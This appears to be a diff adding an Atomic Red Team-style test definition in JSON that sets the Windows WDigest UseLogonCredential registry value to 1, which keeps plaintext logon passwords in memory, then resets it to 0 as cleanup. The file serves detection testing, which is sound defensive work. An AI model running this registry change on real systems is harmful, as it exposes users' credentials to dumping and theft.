@@ -1,0 +1,44 @@
+{
+  "id": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
+  "name": "Modify registry to store logon credentials",
+  "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "8d70a062-fbd4-4c10-b7a7-732a202fda04",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6a5a72d9-71a9-4513-83e3-fd18456060a0",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "8d70a062-fbd4-4c10-b7a7-732a202fda04",
+      "p": "on-success",
+      "o": "6a5a72d9-71a9-4513-83e3-fd18456060a0"
+    },
+    {
+      "s": "8d70a062-fbd4-4c10-b7a7-732a202fda04",
+      "p": "on-failure",
+      "o": "6a5a72d9-71a9-4513-83e3-fd18456060a0"
+    }
+  ],
+  "tags": [
+    "T1112",
+    "atomic-red-team"
+  ]
+}
